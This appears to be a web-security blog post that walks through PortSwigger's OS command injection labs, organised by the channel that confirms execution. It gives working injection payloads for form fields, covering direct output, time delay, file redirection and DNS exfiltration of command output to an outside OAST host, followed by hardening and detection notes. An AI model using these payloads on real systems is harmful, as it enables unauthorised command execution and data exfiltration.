---
layout: post
title: "Blind Command Injection Is a Channel Problem"
date: 2026-06-18 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [os-command-injection, portswigger, oast, dns, egress]
related_posts:
  - request-smuggling-is-a-parser-disagreement
  - four-ways-llm-apps-turn-data-into-actions
  - cve-to-sigma-30min
---

Command injection is easy to describe and easy to under-model.

The bug is not just "user input reaches a shell." The practical question is:

**What channel tells me the command ran?**

The five PortSwigger OS command injection labs make that progression explicit: direct output, time delay, file redirection, DNS interaction, and DNS data exfiltration.

## Start with the channel

| Channel | When it works | Example |
|---------|---------------|---------|
| direct response | stdout/stderr is returned | `1|whoami` |
| time delay | response waits for command completion | `ping -c 10 127.0.0.1` |
| file write | web process can write to a served directory | `whoami>/var/www/images/output.txt` |
| DNS OOB | outbound DNS is allowed | `nslookup x.oast-domain` |
| DNS exfil | OAST logs are visible | ``nslookup `whoami`.oast-domain`` |

This is also the order I want in a test. Prefer the smallest non-destructive proof that gives a clear signal.

## Direct output is the easy case

The stock checker concatenates `storeId` into a shell command and returns raw output:

```http
productId=1&storeId=1|whoami
```

If the response contains the process user, the execution primitive and the observation channel are both confirmed.

## Blind does not mean invisible

The feedback form suppresses output. A local delay gives a timing oracle:

```http
email=x||ping -c 10 127.0.0.1||
```

One small automation detail matters: in form encoding, `+` becomes a space. If your script sets the parameter value directly, use real spaces and let the library encode the body.

## File redirection turns blind into readable

The third lab has a writable image directory that is also served by the application:

```http
email=||whoami>/var/www/images/output.txt||
```

Then:

```http
GET /image?filename=output.txt
```

This is a deployment flaw as much as an injection trick. A web process should not be able to write arbitrary content into a path that the same application serves back to users.

## OOB is the last mile

If the command runs asynchronously and there is no file channel, DNS is the smallest external proof:

```http
email=x||nslookup x.oast-domain||
```

For data exfiltration, put command output into the leftmost DNS label:

```http
email=||nslookup `whoami`.oast-domain||
```

This only works operationally if you can read the OAST logs. Without that, the right workflow is to record the lab as pending collaboration rather than block unrelated work.

DNS has constraints: label length, allowed characters, caching, and resolver behavior. Short values such as usernames fit directly. Longer data needs chunking and DNS-safe encoding.

## Defender notes

Hardening:

- avoid shell invocation for user-controlled operations;
- use argument arrays rather than command strings;
- validate against fixed allowlists;
- keep the application account low-privilege;
- prevent writes into web-served static directories;
- restrict outbound DNS and HTTP egress;
- audit asynchronous command jobs and parameter sources.

Detection:

- shell metacharacters in web fields that should contain email, name, message, product ID, or store ID;
- commands such as `whoami`, `id`, `ping`, `sleep`, `nslookup`, `curl`;
- redirection operators writing into static directories;
- response delays matching regular 5s/10s/20s timing probes;
- application servers resolving random external domains;
- DNS labels that resemble usernames, hostnames, or encoded command output.

The main habit is channel accounting. Before escalating, decide how you will know the command ran. That one question keeps command injection testing controlled, reproducible, and easier to detect.
